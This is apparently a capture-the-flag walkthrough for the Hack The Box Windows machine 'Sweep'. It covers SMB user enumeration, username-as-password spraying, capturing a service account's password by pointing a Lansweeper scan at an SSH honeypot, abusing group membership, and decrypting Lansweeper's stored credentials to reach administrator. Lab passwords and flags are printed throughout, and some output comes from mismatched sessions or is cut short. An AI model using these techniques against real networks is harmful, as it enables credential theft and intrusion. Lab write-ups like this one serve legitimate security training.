---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - SSH-Honeypot
  - SharpLansweeperDecrypt
  - LanSweeper
---
# Overview

| Name        | Sweep   |
| ----------- | ------- |
| OS          | Windows |
| Base Points | Medium  |
| Status      | Done    |
The User flag for this Box is located in a non-standard directory, C:.

Please remember that TCP port 22 traffic to player VPN tunnel IPs is blocked in HTB labs.
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV -T4 10.129.234.177
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-06 23:00 CST
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 57.14% done; ETC: 23:01 (0:00:13 remaining)
Nmap scan report for 10.129.234.177
Host is up (0.26s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
81/tcp   open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
82/tcp   open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Lansweeper Secure Website
| Subject Alternative Name: DNS:localhost, DNS:localhost, DNS:localhost
| Not valid before: 2021-11-21T09:22:27
|_Not valid after:  2121-12-21T09:22:27
| tls-alpn: 
|_  http/1.1
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-01-07 05:01:09Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: sweep.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: sweep.vl0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
|_ssl-date: 2026-01-07T05:02:15+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SWEEP
|   NetBIOS_Domain_Name: SWEEP
|   NetBIOS_Computer_Name: INVENTORY
|   DNS_Domain_Name: sweep.vl
|   DNS_Computer_Name: inventory.sweep.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-07T05:01:44+00:00
| ssl-cert: Subject: commonName=inventory.sweep.vl
| Not valid before: 2026-01-06T04:57:13
|_Not valid after:  2026-07-08T04:57:13
Service Info: Host: INVENTORY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-07T05:01:48
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.49 seconds
```
# Enumeration

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-slq44pmkno]─[~]
└──╼ [★]$ crackmapexec smb 10.129.234.177 -u 'guest' -p '' --shares
SMB         10.129.234.177  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.177  445    INVENTORY        [+] sweep.vl\guest: 
SMB         10.129.234.177  445    INVENTORY        [*] Enumerated shares
SMB         10.129.234.177  445    INVENTORY        Share           Permissions     Remark
SMB         10.129.234.177  445    INVENTORY        -----           -----------     ------
SMB         10.129.234.177  445    INVENTORY        ADMIN$                          Remote Admin
SMB         10.129.234.177  445    INVENTORY        C$                              Default share
SMB         10.129.234.177  445    INVENTORY        DefaultPackageShare$ READ            Lansweeper PackageShare
SMB         10.129.234.177  445    INVENTORY        IPC$            READ            Remote IPC
SMB         10.129.234.177  445    INVENTORY        Lansweeper$                     Lansweeper Actions
SMB         10.129.234.177  445    INVENTORY        NETLOGON                        Logon server share 
SMB         10.129.234.177  445    INVENTORY        SYSVOL                          Logon server share
```

![[sweep.png]]

[Lansweeper](https://en.wikipedia.org/wiki/Lansweeper) is running on the website. I couldn’t login with the default or weak credentials.

> Lansweeper is an IT discovery & inventory platform which delivers insights into the status of users, devices, and software within IT environments. This platform inventories connected IT devices, enabling organizations to centrally manage their IT infrastructure.

We can brute force users as passwords and see if that leads us anywhere. Let’s use [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) for this.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-slq44pmkno]─[~]
└──╼ [★]$ crackmapexec smb 10.129.234.177 -u 'guest' -p '' --shares --rid-brute
SMB         10.129.234.177  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.177  445    INVENTORY        [+] sweep.vl\guest: 
SMB         10.129.234.177  445    INVENTORY        [*] Enumerated shares
SMB         10.129.234.177  445    INVENTORY        Share           Permissions     Remark
SMB         10.129.234.177  445    INVENTORY        -----           -----------     ------
SMB         10.129.234.177  445    INVENTORY        ADMIN$                          Remote Admin
SMB         10.129.234.177  445    INVENTORY        C$                              Default share
SMB         10.129.234.177  445    INVENTORY        DefaultPackageShare$ READ            Lansweeper PackageShare
SMB         10.129.234.177  445    INVENTORY        IPC$            READ            Remote IPC
SMB         10.129.234.177  445    INVENTORY        Lansweeper$                     Lansweeper Actions
SMB         10.129.234.177  445    INVENTORY        NETLOGON                        Logon server share 
SMB         10.129.234.177  445    INVENTORY        SYSVOL                          Logon server share 
SMB         10.129.234.177  445    INVENTORY        498: SWEEP\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        500: SWEEP\Administrator (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        501: SWEEP\Guest (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        502: SWEEP\krbtgt (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        512: SWEEP\Domain Admins (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        513: SWEEP\Domain Users (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        514: SWEEP\Domain Guests (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        515: SWEEP\Domain Computers (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        516: SWEEP\Domain Controllers (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        517: SWEEP\Cert Publishers (SidTypeAlias)
SMB         10.129.234.177  445    INVENTORY        518: SWEEP\Schema Admins (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        519: SWEEP\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        520: SWEEP\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        521: SWEEP\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        522: SWEEP\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        525: SWEEP\Protected Users (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        526: SWEEP\Key Admins (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        527: SWEEP\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        553: SWEEP\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.177  445    INVENTORY        571: SWEEP\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.177  445    INVENTORY        572: SWEEP\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.177  445    INVENTORY        1000: SWEEP\INVENTORY$ (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1101: SWEEP\DnsAdmins (SidTypeAlias)
SMB         10.129.234.177  445    INVENTORY        1102: SWEEP\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        1103: SWEEP\Lansweeper Admins (SidTypeGroup)
SMB         10.129.234.177  445    INVENTORY        1113: SWEEP\jgre808 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1114: SWEEP\bcla614 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1115: SWEEP\hmar648 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1116: SWEEP\jgar931 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1117: SWEEP\fcla801 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1118: SWEEP\jwil197 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1119: SWEEP\grob171 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1120: SWEEP\fdav736 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1121: SWEEP\jsmi791 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1122: SWEEP\hjoh690 (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1123: SWEEP\svc_inventory_win (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1124: SWEEP\svc_inventory_lnx (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        1125: SWEEP\intern (SidTypeUser)
SMB         10.129.234.177  445    INVENTORY        3101: SWEEP\Lansweeper Discovery (SidTypeGroup)

```

```bash
Administrator
Guest
krbtgt
INVENTORY$
jgre808
bcla614
hmar648
jgar931
fcla801
jwil197
grob171
fdav736
jsmi791
hjoh690
svc_inventory_win
svc_inventory_lnx
intern
```

```bash
crackmapexec smb 10.129.234.177 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

I saved the users and brute forced them found password of user `intern`.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-slq44pmkno]─[~]
└──╼ [★]$ crackmapexec smb 10.129.234.177 -u users.txt -p users.txt --no-bruteforce --continue-on-success
SMB         10.129.234.177  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.177  445    INVENTORY        [-] sweep.vl\Administrator:Administrator STATUS_LOGON_FAILURE 
SMB         10.129.234.177  445    INVENTORY        [-] sweep.vl\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.129.234.177  445    INVENTORY        [-] sweep.vl\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.129.234.177  445    INVENTORY        [-] sweep.vl\INVENTORY$:INVENTORY$ STATUS_LOGON_FAILURE 
SMB         10.129.234.177  445    INVENTORY        [-] sweep.vl\jgre808:jgre808 STATUS_LOGON_FAILURE 
SMB         10.129.234.177  445    INVENTORY        [-] sweep.vl\bcla614:bcla614 STATUS_LOGON_FAILURE 
SMB         10.129.234.177  445    INVENTORY        [-] sweep.vl\hmar648:hmar648 STATUS_LOGON_FAILURE 
SMB         10.129.234.177  445    INVENTORY        [-] sweep.vl\jgar931:jgar931 STATUS_LOGON_FAILURE 
SMB         10.129.234.177  445    INVENTORY        [-] sweep.vl\fcla801:fcla801 STATUS_LOGON_FAILURE 
SMB         10.129.234.177  445    INVENTORY        [-] sweep.vl\jwil197:jwil197 STATUS_LOGON_FAILURE 
SMB         10.129.234.177  445    INVENTORY        [-] sweep.vl\grob171:grob171 STATUS_LOGON_FAILURE 
SMB         10.129.234.177  445    INVENTORY        [-] sweep.vl\fdav736:fdav736 STATUS_LOGON_FAILURE 
SMB         10.129.234.177  445    INVENTORY        [-] sweep.vl\jsmi791:jsmi791 STATUS_LOGON_FAILURE 
SMB         10.129.234.177  445    INVENTORY        [-] sweep.vl\hjoh690:hjoh690 STATUS_LOGON_FAILURE 
SMB         10.129.234.177  445    INVENTORY        [-] sweep.vl\svc_inventory_win:svc_inventory_win STATUS_LOGON_FAILURE 
SMB         10.129.234.177  445    INVENTORY        [-] sweep.vl\svc_inventory_lnx:svc_inventory_lnx STATUS_LOGON_FAILURE 
SMB         10.129.234.177  445    INVENTORY        [+] sweep.vl\intern:intern 
```

Login with `intern:intern`:

![[sweep2.png]]

Unfortunately for me, I can’t see the existing creds. Trying to edit the credential just shows dots where the password would be.

Under scanning credentials tab. The `svc_inventory_lnx` user is being used to scan the targets and his credentials as well ;). We can point the scan to our machine and use a SSH sniffing tool to capture the plain text credentials.
# Initial Foothold
## SSH Honeypot

```bash
bloodhound-python -u 'intern' -p 'intern' -d sweep.vl -c all --zip -ns 10.10.90.18
```

Enumerating the user through bloodhound. The user is indeed a high value target for us.

![[1_UUH606h1I1rjroe-dDTg4A.webp]]

I’ll “Add Scanning Target” on the Scanning targets page. Rather than define an asset and asset group, I’ll pick “IP Range” as the target type, giving it my VPN IP:

![[image-20250808071156562.webp]]

There’s a “Scan now” button, but it won’t do anything useful yet.

On the “Scanning credentials” page, I’ll click the “Map Credential” button, select my IP range and enable all the credentials (though only “Inventory Linux” really matters here):

![[image-20250808071436134.webp]]

The creds are now associated with that scan:

![[image-20250808071457043.webp]]

I’ll use [sshesame](https://github.com/jaksi/sshesame) (`apt install sshesame`). I’ll need a config file (base on [their example](https://github.com/jaksi/sshesame/blob/master/sshesame.yaml)) to have it listen on my TUN0 IP and on port 2022:

```
server:
  listen_address: 10.10.14.79:2022
```

I’ll run it and it starts listening. I’ll click “Scan now” next to my scan, and it says it is added to the scanning queue. It can take ~5 minutes, but eventually I’ll see traffic at `sshesame`:

```
WARNING 2025/08/08 11:37:00 Failed to establish SSH connection: EOF
WARNING 2025/08/08 11:37:04 Failed to establish SSH connection: ssh: disconnect, reason 11: Session closed
2025/08/08 11:37:05 [10.129.234.176:62770] authentication for user "svc_inventory_lnx" without credentials rejected
2025/08/08 11:37:05 [10.129.234.176:62770] authentication for user "svc_inventory_lnx" with password "0|5m-U6?/uAX" accepted
2025/08/08 11:37:05 [10.129.234.176:62770] connection with client version "SSH-2.0-RebexSSH_5.0.8372.0" established
2025/08/08 11:37:05 [10.129.234.176:62770] [channel 0] session requested
2025/08/08 11:37:05 [10.129.234.176:62770] [channel 0] command "uname" requested
2025/08/08 11:37:05 [10.129.234.176:62770] [channel 0] closed
2025/08/08 11:37:05 [10.129.234.176:62770] connection closed
2025/08/08 11:37:06 [10.129.234.176:62771] authentication for user "svc_inventory_lnx" without credentials rejected
2025/08/08 11:37:06 [10.129.234.176:62771] authentication for user "svc_inventory_lnx" with password "0|5m-U6?/uAX" accepted
2025/08/08 11:37:06 [10.129.234.176:62771] connection with client version "SSH-2.0-RebexSSH_5.0.8372.0" established
2025/08/08 11:37:06 [10.129.234.176:62771] [channel 0] session requested
2025/08/08 11:37:06 [10.129.234.176:62771] [channel 0] PTY using terminal "xterm" (size 80x25) requested
2025/08/08 11:37:06 [10.129.234.176:62771] [channel 0] shell requested
2025/08/08 11:37:06 [10.129.234.176:62771] [channel 0] input: "smclp"
2025/08/08 11:37:06 [10.129.234.176:62771] [channel 0] input: "show system1"
WARNING 2025/08/08 11:37:16 Error sending CRLF: EOF
2025/08/08 11:37:16 [10.129.234.176:62771] [channel 0] closed
2025/08/08 11:37:16 [10.129.234.176:62771] connection closed
```

The svc_inventory_lnx user connected with the password `0|5m-U6?/uAX”`. These cred work on Sweep for SMB and LDAP but not WinRM.

![[image-20250808074942816.webp]]

The Lansweeper Admins group is a member of the Remote Management Users group:

![[image-20250808075240520.webp]]

I’ll add svc_inventory_lnx to the Lansweeper Admins group using [BloodyAD](https://github.com/CravateRouge/bloodyAD):

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-slq44pmkno]─[~]
└──╼ [★]$ bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '0|5m-U6?/uAX' add groupMember "Lansweeper Admins" svc_inventory_lnx
[+] svc_inventory_lnx added to Lansweeper Admins
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-slq44pmkno]─[~]
└──╼ [★]$ evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '0|5m-U6?/uAX'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_inventory_lnx\Documents> cat c:\user.txt
d2d89a58c454428461b1c7b2547f9165
```
# Privilege Escalation

The filesystem is pretty empty. There are a couple other users on the box, but svc_inventory_lnx can’t access their home directories:

```
evil-winrm-py PS C:\users> ls

    Directory: C:\users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/10/2024   6:31 AM                Administrator
d-----         2/10/2024   6:25 AM                intern
d-----         2/10/2024   6:25 AM                jgre808
d-r---          2/8/2024  10:42 AM                Public
d-----          8/8/2025   5:16 AM                svc_inventory_lnx   
```

lansweeper is installed in`\Program Filesd (x86)`:

```
evil-winrm-py PS C:\Program Files (x86)\Lansweeper> ls

    Directory: C:\Program Files (x86)\Lansweeper

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          2/8/2024  11:46 AM                Actions
d-----          2/8/2024  11:46 AM                Client
d-----          2/8/2024  11:51 AM                IISexpress
d-----          2/8/2024  11:54 AM                Install
d-----          2/8/2024  11:48 AM                Key
d-----          2/8/2024  11:46 AM                PackageShare
d-----         2/10/2024   6:56 AM                Service
d-----          2/8/2024  11:46 AM                SQL script
d-----          2/8/2024  11:48 AM                SQLData
d-----          2/8/2024  11:47 AM                Start
d-----          2/8/2024  11:47 AM                Tools
d-----          2/8/2024  11:46 AM                WebPiCmd
d-----          2/8/2024  11:53 AM                Website
-a----         1/29/2024   5:53 PM        1556256 isxlansw.dll
-a----          2/8/2024  11:47 AM        1208673 unins000.dat
-a----          2/8/2024  11:40 AM        1201960 unins000.exe
-a----          2/8/2024  11:47 AM          22761 unins000.msg  
```

lansweeper keeps it’s credentials in the database. The connection string is in the `web.config` file in `Website`:

```
evil-winrm-py PS C:\Program Files (x86)\Lansweeper> cat Website\web.config
<?xml version="1.0" encoding="utf-8"?>
<configuration>
...[snip]...
        <connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">
  <EncryptedData>
   <CipherData>
    <CipherValue>AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAgzIANE59TESof+KDtzRrYgQAAAACAAAAAAAQZgAAAAEAACAAAADZXXb0nohQo/8w0EjMuxtdrsO+oWE/8nDm/sEaWGOh3wAAAAAOgAAAAAIAACAAAACklghdDLbVFPEM7B4ZpcRybvQgCHDDtgwAAeT5KyzVWtACAADAF3FYUr4SCYc5HSnHnnc6kNS4Rfc09lvTGIzwlOXXrMq2BXQ2rAKsHAKs6u4MLg7AbsuSQ5uXFoLv5gq+G7I7lLKnkjwZtj9q74RubSt1adkMEftUASe1UXOKoZMzjfSat7c80do1he16BvzrxMq4WZ9CMUt7L6oGYCGHLHKWClFNDfCjZpp1nqZMcEylVkz5zgayHZYhAW9C4+NATr+QLm1EGKNeZUmyW+oLkOkuvlj4OLonw1OY8DVMafH0MWY0tRmiFYwVzRpydb0Cw2Ms1rRy9EdLB570Qb45LVE4DqM43oHepfC+dqg0qScPdHxLdtHcWyeKgSlEHvML5kn/9G9g5DCX9QCtTgfVKU30A8zlc1BMYAn9Th0EEUW3UXHRMu+w1QAQmoeCcRN1V0LTtmjvEHazumgtfBXElHKvU3brBJDvyCHtGY9GVXs/Mhn5X9JrLYuP26Tx00vhfRd+jWuiiIVZarLSf/ZPVjBoKQQzHU6S2Aj2IV3tG7vdnrqPScIj3lhCeLhjEEAlLkdOoBefaeIST02PqWYTH6+mQODIp1XeWkhpCYN5ZFZG/vCdy938e159Cz2Bs57JQ7/3gY+RXbXth6/AqK3aiwfxc2qWAnpUazIS8ZYppqnwYSwXOoGtF1N8qUrOO3xYIyC23SgtpsnRibGNPauCzkryg+oQ0kSBYyQsVfUzhgPsXkdhvEPC7yVJ0cfbqYun/Mv00opCSYM0dOMvqaljKFoeraDIlqEqSJwouD80YXVPRhRnajr6hzTUVrMXlXImbWev4NAAjilyjQs3BYGJy5nbx1mkNn9AeWlInBFkmV0oLwy++Ap8tShR6CZoxv6OiR04W5pCAUYxdgERr/aQXvSVXFL2apxfE+oHxSDrzzH9bI82eejiDgjI4PqBrBet+3tMDvGsfjGwElWiy7OfMfhOjgTgggF4SVMYbyWUVGo6gF1AAAAAMOQYm/6r5L1Mzd7iM4dfwt6qqImlYluj/3j03jq2X+4ChPcl4wD9LM5ph9aYnTRNeRHLUeXHvPonZNpB304iLg==</CipherValue>
   </CipherData>
  </EncryptedData>
 </connectionStrings>
 ...[snip]...
```

It’s encrypted. The credentials in the database are also encrypted. The key is stored in `Key\Encryption.txt`:

```
evil-winrm-py PS C:\Program Files (x86)\Lansweeper> ls Key

    Directory: C:\Program Files (x86)\Lansweeper\Key

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          2/8/2024  11:48 AM           1024 Encryption.txt 
```
#### Decrypt

[SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt) handles all of this for me. It will get the connection string from the `web.config` file (and decrypt it if necessary), and then get the credentials from the database and use the key to decrypt those. I can compile the C# into a binary, or use the PowerShell script.

I’ll save [LansweeperDecrypt.ps1](https://github.com/Yeeb1/SharpLansweeperDecrypt/blob/main/LansweeperDecrypt.ps1) to my host, and upload it through `evil-winrm-py`, and run it:

```
evil-winrm-py PS C:\ProgramData> upload LansweeperDecrypt.ps1 LansweeperDecrypt.ps1
Uploading /media/sf_CTFs/hackthebox/sweep-10.129.234.176/LansweeperDecrypt.ps1: 100%|█████████████| 4.07k/4.07k [00:00<00:00, 10.0kB/s]
[+] File uploaded successfully as: C:\ProgramData\LansweeperDecrypt.ps1
evil-winrm-py PS C:\ProgramData> powershell .\LansweeperDecrypt.ps1
[+] Loading web.config file...
[+] Found protected connectionStrings section. Decrypting...
[+] Decrypted connectionStrings section:
<connectionStrings>
    <add name="lansweeper" connectionString="Data Source=(localdb)\.\LSInstance;Initial Catalog=lansweeperdb;Integrated Security=False;User ID=lansweeperuser;Password=Uk2)Dw3!Wf1)Hh;Connect Timeout=10;Application Name=&quot;LsService Core .Net SqlClient Data Provider&quot;" providerName="System.Data.SqlClient" />
</connectionStrings>
[+] Opening connection to the database...
[+] Retrieving credentials from the database...
[+] Decrypting password for user: SNMP Community String
[+] Decrypting password for user: 
[+] Decrypting password for user: SWEEP\svc_inventory_win
[+] Decrypting password for user: svc_inventory_lnx
[+] Credentials retrieved and decrypted successfully:

CredName          Username                Password    
--------          --------                --------    
SNMP-Private      SNMP Community String   private     
Global SNMP                               public      
Inventory Windows SWEEP\svc_inventory_win 4^56!sK&}eA?
Inventory Linux   svc_inventory_lnx       0|5m-U6?/uAX

[+] Database connection closed.
```

The first two entries aren’t that exciting. The forth I already have. But the third is a password for the svc_inventory_win account.
#### Shell

Not only do the creds work, but they are administrator:

```bash
oxdf@hacky$ netexec smb inventory.sweep.vl -u svc_inventory_win -p '4^56!sK&}eA?'
SMB         10.129.234.176  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.234.176  445    INVENTORY        [+] sweep.vl\svc_inventory_win:4^56!sK&}eA? (Pwn3d!)
oxdf@hacky$ netexec winrm inventory.sweep.vl -u svc_inventory_win -p '4^56!sK&}eA?'
WINRM       10.129.234.176  5985   INVENTORY        [*] Windows Server 2022 Build 20348 (name:INVENTORY) (domain:sweep.vl) 
WINRM       10.129.234.176  5985   INVENTORY        [+] swe
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-slq44pmkno]─[~]
└──╼ [★]$ evil-winrm -i inventory.sweep.vl -u svc_inventory_win -p '4^56!sK&}eA?'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_inventory_win\Documents> cat C:\Users\Administrator\Desktop\root.txt
71770ae0f007e2aed64425728977cc65
```

---
